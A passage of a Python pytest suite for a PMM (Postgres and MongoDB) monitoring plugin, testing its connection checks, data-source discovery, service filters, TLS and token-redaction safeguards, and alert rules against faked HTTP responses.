import ast
import dataclasses
import json
import ssl
import urllib.error
from pathlib import Path
from types import SimpleNamespace
from urllib.parse import parse_qs, urlsplit

import pytest
from fastapi.testclient import TestClient

from skopax import clock, remote
from skopax.app import create_app
from skopax.contract import ReadError
from skopax.instances import Instances, PluginState
from skopax.kit import connection
from skopax.messages import msg
from skopax.plugins import pmm
from skopax.plugins.pmm import checks
from skopax.plugins.pmm import client as pmm_client
from skopax.plugins.pmm.client import Pmm, PmmError
from skopax.plugintools import PluginTools
from skopax.registry import BUILTIN, Registry, describe
from skopax.remote import HttpError, Unreachable
from skopax.runtime import Runtime
from skopax.sealer import Sealer, master_key
from skopax.store import Store
from tests.conftest import settings
from tests.fake_http import FakeHttp
from tests.plugin_kit import KIT_KEY, add_instance
from tests.test_engine import NOW
from tests.test_instances import pem
from tests.test_investigator_tools import box

URL = 'https://pmm.example.com'
EAST_URL = 'https://pmm-east.example.com'
TOKEN = 'glsa_example_token'
USER = 'alice@example.com'
METRICS_UID, QAN_UID = 'metrics-uid', 'qan-uid'
DATASOURCES = [{'uid': 'logs', 'name': 'Logs', 'type': 'loki'}, {'uid': METRICS_UID, 'name': 'Metrics', 'type': 'prometheus'},
               {'uid': 'other', 'name': 'Other', 'type': 'prometheus'}, {'uid': QAN_UID, 'name': 'ClickHouse', 'type': 'grafana-clickhouse-datasource'}]
PG = ('pg-1-primary', 'pg-2-replica', 'pg-3-replica', 'pg-4-replica', 'pg-5-data', 'pg-6-data-replica', 'pg-7-extra')
PRIMARY, R1, R2, R3, DATA_P, DATA_R, EXTRA = PG
MG = ('mongo-rs0-1', 'mongo-rs0-2', 'mongo-rs0-3', 'mongo-rs0-4')
M1, M2, M3, M4 = MG
EAST_PG = ('pg-east-1',)
EAST_MG = ('mongo-east-1',)
NO_CHECK_TIME = 0x200000
REFUSED_TLS = ('check_hostname', 'CERT_NONE', 'verify_flags', 'verify_mode', 'SSLContext', 'create_default_context', '_create_unverified_context')



@pytest.fixture(autouse=True)
def fresh_qan_columns():
    getattr(pmm_client, 'COLUMNS', {}).clear()
    yield
    getattr(pmm_client, 'COLUMNS', {}).clear()


def metrics_path(base: str = URL, uid: str = METRICS_UID) -> str:
    return f'{base}/graph/api/datasources/proxy/uid/{uid}/api/v1/query'


def qan_path(base: str = URL) -> str:
    return f'{base}/graph/api/ds/query'


def pmm_data() -> dict:
    data = {(k, i): [] for k in checks.pg_queries('.*') for i in range(3)}

    def put(k, metric, *values):
        for i, v in enumerate(values):
            if v is not None:
                data[(k, i)].append((metric, v))

    for s in PG:
        put('up', {'service_name': s}, None if s == EXTRA else 0 if s == DATA_R else 1, 1, 1)
        put('maxconn', {'service_name': s}, 1000)
    put('conn', {'service_name': PRIMARY}, 800, 300, 320)
    put('conn', {'service_name': R1}, 600, 200, 210)
    for s in (R2, R3, DATA_P):
        put('conn', {'service_name': s}, 50, 50, 50)
    put('idletx', {'service_name': R3}, 25, 2, 1)
    put('longtx', {'service_name': PRIMARY, 'datname': 'app_x', 'usename': 'usr_x', 'state': 'active'}, 1500, 100, 200)
    put('longtx', {'service_name': PRIMARY, 'datname': 'app_y', 'usename': 'usr_y', 'state': 'idle in transaction'}, 30, 20, 20)
    put('lag', {'service_name': R2}, 10850, 10800, 10800)
    put('lag', {'service_name': R3}, 300, 5, 5)
    put('deadlocks', {'service_name': PRIMARY, 'datname': 'app_orders'}, 2, 0, 0)
    put('deadlocks', {'service_name': PRIMARY, 'datname': 'app_billing'}, 0.2, 0, 0)
    put('lockwait', {'service_name': PRIMARY}, 12, 4, 4)
    put('lockmins', {'service_name': PRIMARY}, 9, 12, 12)
    return data


def mongo_data(set_label: str | None = None) -> dict:
    data = {(k, i): [] for k in checks.mongo_queries('.*') for i in range(3) if k != 'names' or i == 0}
    tag = {} if set_label is None else {'set': set_label}

    def put(k, metric, *values):
        for i, v in enumerate(values):
            if v is not None:
                data[(k, i)].append((metric, v))

    for s in (M1, M2, M3):
        put('up', {'service_name': s}, 1, 1, 1)
    put('up', {'service_name': M4}, None, 1, 1)
    put('state', {'service_name': M1, **tag}, 1, 1, 1)
    put('state', {'service_name': M2, **tag}, 2, 2, 2)
    put('state', {'service_name': M3, **tag}, 3, 2, 2)
    put('state', {'service_name': M4, **tag}, None, 2, 2)
    put('statechg', {'service_name': M2}, 1, 0, 0)
    put('conn', {'service_name': M1}, 500, 200, 210)
    put('conn', {'service_name': M2}, 80, 80, 80)
    put('avail', {'service_name': M1}, 25000)
    put('lag', {'name': '10.0.0.2:27017'}, 200, 1, 1)
    for s, n in ((M1, 1), (M2, 2), (M3, 3)):
        put('names', {'service_name': s, 'name': f'10.0.0.{n}:27017', 'node_name': f'db-node-{n}'}, 1)
    put('ops', {'service_name': M1}, 100000, 90000, 95000)
    put('lat', {'service_name': M1, 'type': 'read'}, 30_000_000, 2_000_000, 2_000_000)
    put('latn', {'service_name': M1, 'type': 'read'}, 2000, 2000, 2000)
    put('lat', {'service_name': M1, 'type': 'write'}, 1_000_000, 1_000_000, 1_000_000)
    put('latn', {'service_name': M1, 'type': 'write'}, 500, 500, 500)
    put('queue', {'service_name': M1}, 30, 2, 2)
    return data


def mongo_layout(members: dict[str, tuple[int | None, str | None]]) -> dict:
    data = {(k, i): [] for k in checks.mongo_queries('.*') for i in range(3) if k != 'names' or i == 0}
    for svc, (role, name) in members.items():
        for i in range(3):
            data[('up', i)].append(({'service_name': svc}, 1))
            if role is not None:
                data[('state', i)].append(({'service_name': svc, **({'set': name} if name else {})}, role))
    return data


def qan_data() -> tuple[list[dict], list[dict]]:
    rows = [
        dict(service_name=PRIMARY, database='checkout_service', queryid='q1', q='UPDATE stock SET count = $1 WHERE code = $2',
             c0=150000, t0=2500, c1=140000, t1=800, c2=130000, t2=790, pk0=0.5, pkat0=NOW - 1200, pkc0=600),
        dict(service_name=R1, database='orders_service', queryid='q2', q='SELECT * FROM orders WHERE id = $1',
             c0=1000, t0=120, c1=1000, t1=10, c2=900, t2=9, pk0=0, pkat0=0, pkc0=0),
        dict(service_name=PRIMARY, database='customer_service', queryid='q3', q='SELECT 1',
             c0=900000, t0=20, c1=100000, t1=2, c2=100000, t2=2, pk0=0.00002, pkat0=NOW - 600, pkc0=15000),
        dict(service_name=R1, database='customer_service', queryid='q4', q='SELECT t.total FROM reports.daily t',
             c0=1000, t0=400, c1=0, t1=0, c2=0, t2=0, pk0=0.4, pkat0=NOW - 300, pkc0=1000),
    ]
    totals = [dict(service_name=PRIMARY, t0=3000, t1=1000, t2=900), dict(service_name=R1, t0=500, t1=450, t2=470)]
    return rows, totals


def vector(params: dict, rows: list[tuple[dict, float]]) -> dict:
    return {'status': 'success', 'data': {'resultType': 'vector', 'result': [{'metric': m, 'value': [float(params['time'][0]), str(v)]} for m, v in rows]}}


def metric_answer(pg=PG, mongo=MG, conn: float = 50, empty: bool = False, state_set: str | None = None, locks: bool = True):
    def answer(params, body):
        expr = params['query'][0]
        if empty or (not locks and 'pg_lock_conflicts_count' in expr):
            return vector(params, [])
        if 'mongodb' in expr:
            value = 1 if 'mongodb_up' in expr else 2 if 'my_state' in expr else 0
            tag = {'set': state_set} if state_set and 'my_state' in expr else {}
            rows = [({'service_name': s, 'name': f'h{i}:27017', 'node_name': f'n{i}', **tag}, 1 if 'my_state' in expr and i == 0 else value) for i, s in enumerate(mongo)]
            return vector(params, rows)
        value = 1 if 'pg_up' in expr else 1000 if 'max_connections' in expr else conn if 'pg_stat_activity_count' in expr and 'idle in transaction' not in expr else 0
        return vector(params, [({'service_name': s}, value) for s in pg])

    return answer


def qan_answer(server: str = PRIMARY, empty: bool = False, uids: tuple[str, ...] = (QAN_UID,)):
    def answer(params, body):
        if body['queries'][0]['datasource']['uid'] not in uids:
            return HttpError(404, qan_path())
        if empty or 'queryid' in body['queries'][0]['rawSql']:
            return {'results': {'A': {'frames': []}}}
        names = ['service_name', 't0', 't1', 't2']
        return {'results': {'A': {'frames': [{'schema': {'fields': [{'name': n} for n in names]}, 'data': {'values': [[server], [10.0], [9.0], [8.0]]}}]}}}

    return answer


def pmm_routes(base: str = URL, datasources=None, metrics=None, qan=None, version=None) -> dict:
    listed = DATASOURCES if datasources is None else datasources
    found = metrics or metric_answer()
    return {('GET', f'{base}/v1/version'): {'version': '2.41.2'} if version is None else version,
            ('GET', f'{base}/graph/api/datasources'): listed,
            **{('GET', metrics_path(base, d['uid'])): found for d in listed if d['type'] == 'prometheus'},
            **{('GET', metrics_path(base, d['uid']) + '_range'): found for d in listed if d['type'] == 'prometheus'},
            ('POST', qan_path(base)): qan or qan_answer()}


def pmm_runtime(store: Store, http=None, **instances: dict) -> Runtime:
    registry = Registry.of(pmm.PLUGIN)
    runtime = Runtime(registry, PluginState(store.db), Instances(store.db, registry, lambda: Sealer(KIT_KEY)), http)
    for index, (name, values) in enumerate((instances or {'main': {}}).items()):
        add_instance(store, pmm.PLUGIN, name, sealer_key=KIT_KEY, primary=index == 0, **({'url': URL, 'token': TOKEN} | values))
    runtime.refresh()
    return runtime


def connection_of(runtime: Runtime, name: str = 'main'):
    return pmm.test(runtime.context(pmm.PLUGIN, runtime.instances.get('pmm', name), NOW))


def app_with(store: Store, http, **instances: dict) -> TestClient:
    key = master_key(store.db, settings())
    for index, (name, values) in enumerate(instances.items()):
        add_instance(store, pmm.PLUGIN, name, sealer_key=key, primary=index == 0, **({'url': URL, 'token': TOKEN} | values))
    return TestClient(create_app(settings(), store, transport=http))


def sweep(c: TestClient, *check_ids: str, now: float = NOW) -> None:
    for check_id in check_ids or ('pmm', 'qan', 'mongo'):
        c.app.state.sweeper.run('pmm', check_id, now)


def cards_of(store: Store) -> dict[str, dict]:
    return {a['key']: a for a in store.load()['anomalies']}


def tool_box(store: Store, http, **instances: dict):
    return box(store, plugin_tools=PluginTools(pmm_runtime(store, http, **instances)))


def asked(http: FakeHttp) -> list[tuple]:
    out = []
    for method, url, headers, body in http.calls:
        path, params = urlsplit(url).path, parse_qs(urlsplit(url).query)
        if path.endswith('/api/v1/query'):
            out.append(('instant', params['query'][0], float(params['time'][0])))
        elif path.endswith('/api/v1/query_range'):
            out.append(('range', params['query'][0], float(params['start'][0]), float(params['end'][0]), int(params['step'][0])))
    return out


def test_pmm_identity_and_manifest():
    # given
    registry = Registry.of(pmm.PLUGIN)

    # when
    loaded = registry.get('pmm')
    manifest = describe(pmm.PLUGIN, icon=True)

    # then
    assert (loaded.state, loaded.reason) == ('ok', None) and 'skopax.plugins.pmm' in BUILTIN
    assert Registry.load({}, entry_points=False).get('pmm').state == 'ok'
    assert json.loads(json.dumps(manifest)) == manifest
    assert (manifest['name'], manifest['version'], manifest['category'], manifest['author'], manifest['licence'], manifest['core'], manifest['edition']) == (
        'PMM (Postgres, MongoDB)', '0.1.0', 'infrastructure', 'Skopax', 'AGPL-3.0-only', '>=0.1,<0.8', 'community')
    assert manifest['capabilities'] == {'hosts': ['@url'], 'secrets': ['token'], 'agentReads': False} and manifest['uses'] == []
    assert [(f['key'], f['kind'], f['required'], f['ui']) for f in manifest['fields']] == [
        ('url', 'url', True, True), ('token', 'secret', True, False), ('ca', 'pem', False, False), ('ca-pinned', 'bool', False, False), ('metrics-datasource', 'text', False, False),
        ('qan-datasource', 'text', False, False), ('postgres-services', 'regex', False, False), ('mongo-services', 'regex', False, False),
        ('replica-set', 'text', False, False), ('exclude-users', 'text', False, False), ('split-users', 'text', False, False), ('qan-app', 'regex', False, False),
        ('host-header', 'text', False, False), ('link-base', 'url', False, True)]
    assert [(c['id'], c['period'], c['offset'], c['ran']) for c in manifest['checks']] == [('pmm', 900, 360, ['pmm']), ('qan', 900, 360, ['qan']), ('mongo', 900, 360, ['mongo'])]
    assert [(c.id, c.sections, c.tool) for c in pmm.PLUGIN.checks] == [('pmm', ('pmm',), 'pmm_query'), ('qan', ('qan',), 'qan'), ('mongo', ('mongo',), 'pmm_query')]
    assert [(t['name'], t['kind']) for t in manifest['tools']] == [('pmm_query', 'read'), ('qan', 'read')]
    assert all(t.scan and t.instance_input == 'instance' and t.per_run is None for t in pmm.PLUGIN.tools)
    assert [r['id'] for r in manifest['rules']] == ['postgres', 'qan', 'mongo']
    assert manifest['panels'] == [{'tab': 'pg', 'script': 'panel.js', 'fragment': None, 'label': 'Postgres', 'group': 'observe'},
                                  {'tab': 'mongo', 'script': 'panel.js', 'fragment': None, 'label': 'MongoDB', 'group': 'observe'}]
    assert manifest['knowledge'] == ['pmm'] and len(pmm.PLUGIN.knowledge[0].text.splitlines()) <= 40
    assert registry.icon('pmm').startswith('<svg')


def test_pmm_defaults_are_neutral():
    # when
    fields = {f.key: f.default for f in pmm.PLUGIN.fields}
    rules = {r.id: dict(r.defaults) for r in pmm.PLUGIN.rules}

    # then
    assert fields == {'url': '', 'token': '', 'ca': '', 'ca-pinned': 'false', 'metrics-datasource': '', 'qan-datasource': '', 'postgres-services': '.*', 'mongo-services': '.*',
                      'replica-set': '', 'exclude-users': 'pmm', 'split-users': '', 'qan-app': '', 'host-header': '', 'link-base': ''}
    assert pmm.PLUGIN.settings == ()
    assert rules == {
        'postgres': dict(sat_warn=70, sat_crit=85, jump=1.5, jump_slack=200, idletx=20, longtx=600, lag=60, lock=5, lock_x=2, lock_slack=2),
        'qan': dict(load=120, load_crit=1800, slow_ms=50, slow_calls=500, slow_min_s=30, calls=200000, total=900, top=12, rows_min_s=5, rows_min_calls=100000,
                    stall_x=20, stall_ms=50, stall_s=30),
        'mongo': dict(sat_warn=70, sat_crit=85, jump=1.5, jump_slack=200, lag=60, lat_x=2, lat_ms=5, lat_ops=1000, queue=20)}


def test_pmm_connection_test_reports_ok_and_failures(store: Store):
    # given
    version = f'{URL}/v1/version'
    good = FakeHttp(pmm_routes())
    denied = FakeHttp(pmm_routes(version=HttpError(401, version)))
    down = FakeHttp(pmm_routes(version=Unreachable('x')))
    later = FakeHttp(pmm_routes(version=HttpError(404, version)) | {('GET', f'{URL}/v1/server/version'): {'version': '3.0.1'}})
    no_version = FakeHttp(pmm_routes(version=HttpError(404, version)))

    # when
    ok, refused, unreachable, newer, unknown = (connection_of(pmm_runtime(store, http)) for http in (good, denied, down, later, no_version))

    # then
    assert (ok.ok, ok.summary) == (True, 'PMM 2.41.2 \u00b7 metrics: Metrics (metrics-uid) \u00b7 QAN: ClickHouse (qan-uid)') and isinstance(ok.ms, int)
    assert (refused.ok, refused.summary) == (False, msg('connection.rejected', status=401))
    assert (unreachable.ok, unreachable.summary) == (False, msg('connection.unreachable'))
    assert (newer.ok, newer.summary) == (True, 'PMM 3.0.1 \u00b7 metrics: Metrics (metrics-uid) \u00b7 QAN: ClickHouse (qan-uid)')
    assert (unknown.ok, unknown.summary) == (True, 'PMM unknown version \u00b7 metrics: Metrics (metrics-uid) \u00b7 QAN: ClickHouse (qan-uid)')
    assert [c[1] for c in no_version.calls[:2]] == [version, f'{URL}/v1/server/version']
    assert [c[1].split('?')[0] for c in good.calls] == [version, f'{URL}/graph/api/datasources', metrics_path(), qan_path()] and good.calls[0][2]['Authorization'] == f'Bearer {TOKEN}'
    assert TOKEN not in ok.summary


def test_empty_datasources_are_discovered_and_listed_by_the_test(store: Store):
    # given
    http = FakeHttp(pmm_routes() | pmm_routes(EAST_URL, datasources=[]))

    # when
    discovered = connection_of(pmm_runtime(store, http))
    with app_with(store, http, main={}, east={'url': EAST_URL}) as c:
        sweep(c, 'pmm', 'qan')
        state = store.load()
    none = connection_of(pmm_runtime(store, http, main={}, east={'url': EAST_URL}), 'east')

    # then
    assert discovered.summary == 'PMM 2.41.2 \u00b7 metrics: Metrics (metrics-uid) \u00b7 QAN: ClickHouse (qan-uid)'
    assert http.hits(metrics_path()) and not http.hits(metrics_path(uid='other'))
    assert {c[3]['queries'][0]['datasource']['uid'] for c in http.hits(qan_path())} == {QAN_UID}
    assert state['sources']['pmm'] == 'ok' and state['sources']['qan'] == 'ok'
    assert state['sources']['pmm-east'] == 'error: PMM lists no metrics data source the token can read' and state['sources']['qan-east'] == 'error: PMM lists no QAN data source the token can read'
    assert none.ok and none.summary == 'PMM 2.41.2 \u00b7 metrics: none found \u00b7 QAN: none found'


def test_pinned_datasources_are_checked_with_a_query_not_a_listing(store: Store):
    # given
    listing = f'{URL}/graph/api/datasources'
    http = FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)})

    # when
    pinned = connection_of(pmm_runtime(store, http, main={'metrics-datasource': 'other', 'qan-datasource': QAN_UID}))
    calls = list(http.calls)
    wrong_qan = connection_of(pmm_runtime(store, http, main={'metrics-datasource': 'other', 'qan-datasource': 'gone'}))
    wrong_metrics = connection_of(pmm_runtime(store, http, main={'metrics-datasource': 'nope', 'qan-datasource': QAN_UID}))
    half = connection_of(pmm_runtime(store, FakeHttp(pmm_routes()), main={'metrics-datasource': 'other'}))

    # then
    assert (pinned.ok, pinned.summary) == (True, 'PMM 2.41.2 \u00b7 metrics: other (pinned) \u00b7 QAN: qan-uid (pinned)')
    assert not [c for c in calls if c[1] == listing]
    assert [parse_qs(urlsplit(c[1]).query)['query'][0] for c in calls if c[1].split('?')[0] == metrics_path(uid='other')] == ['vector(1)']
    assert [c[3]['queries'][0]['rawSql'] for c in calls if c[1] == qan_path()] == ['SELECT 1']
    assert (wrong_qan.ok, wrong_qan.summary) == (False, 'the QAN data source gone does not answer (PMM QAN query HTTP 404)')
    assert (wrong_metrics.ok, wrong_metrics.summary) == (False, 'the metrics data source nope does not answer (PMM metrics query HTTP 404)')
    assert (half.ok, half.summary) == (True, 'PMM 2.41.2 \u00b7 metrics: Other (other) \u00b7 QAN: ClickHouse (qan-uid)')


def test_a_failed_discovery_lists_once_per_pass_and_names_the_reason(store: Store):
    # given
    listing, east_listing = f'{URL}/graph/api/datasources', f'{EAST_URL}/graph/api/datasources'
    http = FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)} | pmm_routes(EAST_URL, datasources=[]))

    # when
    counts = []
    with app_with(store, http, main={}, east={'url': EAST_URL}) as c:
        for check_id in ('pmm', 'mongo', 'qan'):
            sweep(c, check_id)
            counts.append((len(http.hits(listing)), len(http.hits(east_listing))))
        state = store.load()

    # then
    assert counts == [(1, 1), (2, 2), (3, 3)]
    assert {state['sources'][k] for k in ('pmm', 'mongo', 'qan')} == {'ok \u00b7 no access to data sources'}
    assert [state['sources'][k] for k in ('pmm-east', 'mongo-east', 'qan-east')] == ['error: PMM lists no metrics data source the token can read'] * 2 + ['error: PMM lists no QAN data source the token can read']
    assert not http.hits(metrics_path()) and not http.hits(qan_path())


def test_service_patterns_filter_postgres_and_mongo_rows(store: Store):
    # given
    http = FakeHttp(pmm_routes(qan=qan_answer(server=R1)))
    patterns = {'postgres-services': 'pg-[12]-.*', 'mongo-services': "mongo-rs0-[13]", 'exclude-users': "pmm, o'brien"}

    # when
    with app_with(store, http, main=patterns) as c:
        sweep(c)
        state = store.load()

    # then
    sent = [parse_qs(urlsplit(call[1]).query)['query'][0] for call in http.hits(metrics_path())]
    sql = [call[3]['queries'][0]['rawSql'] for call in http.hits(qan_path())]
    assert [r['svc'] for r in state['pmm']] == [PRIMARY, R1]
    assert [r['svc'] for r in state['mongo']] == [M1, M3]
    assert all('service_name=~"pg-[12]-.*"' in q for q in sent if 'pg_' in q) and all('service_name=~"mongo-rs0-[13]"' in q for q in sent if 'mongodb_' in q)
    assert all("match(service_name, '^(?:pg-[12]-.*)$')" in s and "username NOT IN ('pmm', 'o\\'brien')" in s for s in sql) and len(sql) == 2
    assert all("service_type = 'postgresql'" in s for s in sql)
    assert state['sources']['qan'] == 'ok'


def test_pmm_second_instance_is_scoped(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(conn=800)) | pmm_routes(EAST_URL, metrics=metric_answer(pg=EAST_PG, mongo=EAST_MG, conn=800)))

    # when
    with app_with(store, http, main={}, east={'url': EAST_URL}) as c:
        sweep(c, 'pmm')
        state = store.load()
    cards = cards_of(store)

    # then
    east = cards['pmm|pg-east-1|saturation@east']
    assert (east['cluster'], east['ranKey'], east['short'].split(' ')[1]) == ('east', 'pmm-east', 'EAST')
    assert 'cluster' not in cards[f'pmm|{PRIMARY}|saturation'] and cards[f'pmm|{PRIMARY}|saturation'].get('ranKey') in (None, '')
    assert set(state['serverPasses']) == {'pmm', 'pmm-east'} and state['sources']['pmm-east'] == 'ok'
    assert {r.get('cluster') for r in state['pmm'] if r['svc'] == 'pg-east-1'} == {'east'}


def test_pmm_rules_come_from_the_rule_set(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(conn=800)))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'pmm')
        default = {k for k in cards_of(store) if k.endswith('|saturation')}
        c.app.state.runtime.live.set('pmm.postgres', '{"sat_warn": 90, "sat_crit": 95}', USER)
        store.anomalies.delete_many({})
        store.save_state({'anomalies': [], 'initialized': True}, None)
        sweep(c, 'pmm')
        stricter = {k for k in cards_of(store) if k.endswith('|saturation')}

    # then
    assert default == {f'pmm|{s}|saturation' for s in PG} and stricter == set()


def test_postgres_mongo_and_qan_without_any_series_are_ok_and_quiet(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(conn=800)))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c)
        opened = {k for k, a in cards_of(store).items() if a['status'] == 'open'}
        http.routes.update(pmm_routes(metrics=metric_answer(empty=True), qan=qan_answer(empty=True)))
        sweep(c, now=NOW + 900)
        state = store.load()
    cards = cards_of(store)

    # then
    assert f'pmm|{PRIMARY}|saturation' in opened
    assert {state['sources'][k] for k in ('pmm', 'qan', 'mongo')} == {'ok \u00b7 no data'}
    assert all(cards[k]['status'] == 'open' for k in opened)
    assert (state['pmm'], state['qan'], state['mongo']) == ([], [], [])


def test_pmm_custom_ca_is_used_and_never_disabled(store: Store, monkeypatch):
    # given
    good, wrong = pem(), pem()
    built: dict[int, str] = {}
    used: list[ssl.SSLContext] = []
    real = ssl.create_default_context

    def spy(*args, **kwargs):
        context = real(*args, **kwargs)
        built[id(context)] = kwargs.get('cadata')
        return context

    class Answer:
        def __init__(self, body):
            self.raw, self.headers = json.dumps(body).encode(), {'content-type': 'application/json'}

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self, *limit):
            return self.raw

    class Opener:
        def __init__(self, context):
            self.context = context

        def open(self, request, timeout):
            used.append(self.context)
            if built.get(id(self.context)) != good:
                raise urllib.error.URLError(ssl.SSLCertVerificationError(1, 'certificate verify failed'))
            return Answer({'/v1/version': {'version': '2.41.2'}, '/graph/api/datasources': DATASOURCES, urlsplit(metrics_path()).path: vector({'time': ['0']}, []),
                           urlsplit(qan_path()).path: {'results': {'A': {'frames': []}}}}[urlsplit(request.full_url).path])

    monkeypatch.setattr(ssl, 'create_default_context', spy)
    monkeypatch.setattr(remote, 'opener', lambda context=None, follow=True: Opener(context))
    runtime = pmm_runtime(store, None, main={'ca': good}, east={'url': EAST_URL, 'ca': wrong})
    package = Path(pmm.__file__).parent

    # when
    trusted, refused = connection_of(runtime), connection_of(runtime, 'east')
    names = {n.id if isinstance(n, ast.Name) else n.attr for f in package.glob('*.py') for n in ast.walk(ast.parse(f.read_text(encoding='utf-8'))) if isinstance(n, (ast.Name, ast.Attribute))}
    imports = {a.name for f in package.glob('*.py') for n in ast.walk(ast.parse(f.read_text(encoding='utf-8'))) if isinstance(n, ast.Import) for a in n.names}
    imports |= {n.module for f in package.glob('*.py') for n in ast.walk(ast.parse(f.read_text(encoding='utf-8'))) if isinstance(n, ast.ImportFrom) and n.module}

    # then
    assert runtime.transport is None
    assert {built[id(c)] for c in used} == {good, wrong}
    assert (trusted.ok, trusted.summary) == (True, 'PMM 2.41.2 \u00b7 metrics: Metrics (metrics-uid) \u00b7 QAN: ClickHouse (qan-uid)')
    assert (refused.ok, refused.summary) == (False, msg('connection.tls'))
    assert used and all(c.check_hostname is True and c.verify_mode == ssl.CERT_REQUIRED and not c.verify_flags & NO_CHECK_TIME for c in used)
    assert not names & set(REFUSED_TLS) and 'ssl' not in imports


def test_every_call_carries_the_bearer_token():
    # given
    http = FakeHttp(pmm_routes())
    client = Pmm(URL, 'glsa_tok', http)

    # when
    got = client.vec('max by (service_name) (pg_up)', NOW)

    # then
    assert len(got) == len(PG) and got[0][1] == 1.0
    method, url, headers, body = http.hits(metrics_path())[0]
    assert method == 'GET' and headers['Authorization'] == 'Bearer glsa_tok' and 'Host' not in headers
    assert f'time={NOW:.3f}' in url


def test_nan_and_infinite_samples_are_dropped():
    # given
    answer = {'status': 'success', 'data': {'result': [{'metric': {'a': '1'}, 'value': [NOW, 'NaN']}, {'metric': {'a': '2'}, 'value': [NOW, '+Inf']},
                                                       {'metric': {'a': '3'}, 'value': [NOW, '4']}]}}

    # when
    got = Pmm(URL, 'tok', FakeHttp(pmm_routes(metrics=answer))).vec('x', NOW)

    # then
    assert got == [({'a': '3'}, 4.0)]


def test_a_range_query_goes_to_query_range_with_start_end_and_step():
    # given
    series = [{'metric': {'service_name': PRIMARY}, 'values': [[NOW - 60, '3'], [NOW, '4']]}]
    http = FakeHttp(pmm_routes(metrics={'status': 'success', 'data': {'resultType': 'matrix', 'result': series}}))

    # when
    got = Pmm(URL, 'tok', http).range_query('pg_up', NOW - 3600, NOW, 60)

    # then
    assert got == series
    method, url, headers, _ = http.hits(metrics_path() + '_range')[0]
    assert method == 'GET' and headers['Authorization'] == 'Bearer tok'
    assert f'start={NOW - 3600:.3f}' in url and f'end={NOW:.3f}' in url and 'step=60' in url and 'query=pg_up' in url


def test_a_failed_range_query_is_raised_with_a_short_reason():
    # given
    refused = Pmm(URL, 'tok', FakeHttp(pmm_routes(metrics=HttpError(400, metrics_path()))))
    bad = Pmm(URL, 'tok', FakeHttp(pmm_routes(metrics={'status': 'error', 'error': 'parse error at char 3'})))

    # when
    with pytest.raises(PmmError) as e1:
        refused.range_query('x', NOW - 60, NOW, 60)
    with pytest.raises(PmmError) as e2:
        bad.range_query('x(', NOW - 60, NOW, 60)

    # then
    assert e1.value.reason == 'PMM metrics range query HTTP 400'
    assert e2.value.reason == 'PMM metrics range query answered an error' and 'parse error' in e2.value.detail


def test_a_refused_call_fails_with_a_short_reason_without_the_token():
    # given
    client = Pmm(URL, 'very-secret', FakeHttp(pmm_routes(metrics=HttpError(401, metrics_path(), 'token very-secret refused'))))
    straddling = PmmError('PMM metrics query answered an error', 'x' * 295 + 'very-secret and more')

    # when
    with pytest.raises(PmmError) as e:
        client.vec('x', NOW)
    cut = straddling.shown('very-secret')

    # then
    assert e.value.reason == 'PMM metrics query HTTP 401'
    assert 'very-secret' not in e.value.reason and 'very-secret' not in e.value.shown('very-secret')
    assert 'very-s' not in cut and cut.endswith('x*** a') and len(cut) == len('PMM metrics query answered an error: ') + 300


def test_qan_posts_the_sql_to_the_clickhouse_datasource_and_reads_the_frames():
    # given
    http = FakeHttp(pmm_routes())

    # when
    rows = Pmm(URL, 'tok', http).qan('SELECT 1', 2, NOW)

    # then
    assert rows == [{'service_name': PRIMARY, 't0': 10.0, 't1': 9.0, 't2': 8.0}]
    body = http.hits(qan_path())[0][3]
    assert body['queries'][0]['datasource'] == {'uid': QAN_UID, 'type': 'grafana-clickhouse-datasource'} and body['queries'][0]['rawSql'] == 'SELECT 1'
    assert (int(body['to']) - int(body['from'])) == 2 * 3600000 and int(body['to']) == int(NOW * 1000)


def test_a_qan_error_is_raised():
    # given
    client = Pmm(URL, 'tok', FakeHttp(pmm_routes(qan={'results': {'A': {'error': 'Syntax error near SELEC'}}})))

    # when
    with pytest.raises(PmmError) as e:
        client.qan('SELEC', 1, NOW)

    # then
    assert e.value.reason == 'PMM QAN query answered an error' and 'Syntax error' in e.value.detail


def test_postgres_rules_flag_saturation_jumps_down_lag_locks_and_deadlocks():
    # when
    found, rows = checks.evaluate_pmm(pmm_data(), checks.PMM_RULE)

    # then
    by = {x['key']: x for x in found}
    assert by[f'pmm|{PRIMARY}|saturation']['sev'] == 'warn'
    assert f'pmm|{PRIMARY}|conn-jump' in by and f'pmm|{R1}|conn-jump' in by
    assert by[f'pmm|{EXTRA}|down']['label'] == 'not reported by PMM' and by[f'pmm|{DATA_R}|down']['label'] == 'Postgres down'
    assert f'pmm|{R3}|repl-lag' in by and f'pmm|{R2}|repl-lag' not in by
    assert f'pmm|{R3}|idle-in-tx' in by and f'pmm|{PRIMARY}|long-tx' in by and f'pmm|{PRIMARY}|lock-waits' in by
    assert by[f'pmm|{PRIMARY}|deadlocks']['sev'] == 'info' and 'app_orders' in by[f'pmm|{PRIMARY}|deadlocks']['what']
    assert [r['svc'] for r in rows] == list(PG)


def test_postgres_without_any_pg_up_has_no_data():
    # given
    data = {k: [] for k in pmm_data()}

    # when
    got = checks.evaluate_pmm(data, checks.PMM_RULE)

    # then
    assert got is None


def test_mongo_rules_flag_state_election_lag_latency_and_queue():
    # when
    found, rows = checks.evaluate_mongo(mongo_data(), checks.MONGO_RULE, replica_set='rs0')

    # then
    by = {x['key']: x for x in found}
    assert by[f'mongo|{M3}|state']['sev'] == 'crit' and by[f'mongo|{M4}|down']['sev'] == 'crit'
    assert by['mongo|rs0|election']['sev'] == 'warn' and M1 in by['mongo|rs0|election']['what']
    assert f'mongo|{M2}|repl-lag' in by and f'mongo|{M1}|latency-read' in by and f'mongo|{M1}|latency-write' not in by
    assert f'mongo|{M1}|conn-jump' in by and f'mongo|{M1}|queue' in by
    assert [r['svc'] for r in rows] == list(MG) and {r['set'] for r in rows} == {'rs0'}


def test_the_replica_set_comes_from_the_field_then_the_set_label_then_a_fixed_name():
    # when
    named = {x['key'] for x in checks.evaluate_mongo(mongo_data('rs9'), checks.MONGO_RULE, replica_set='rs0')[0]}
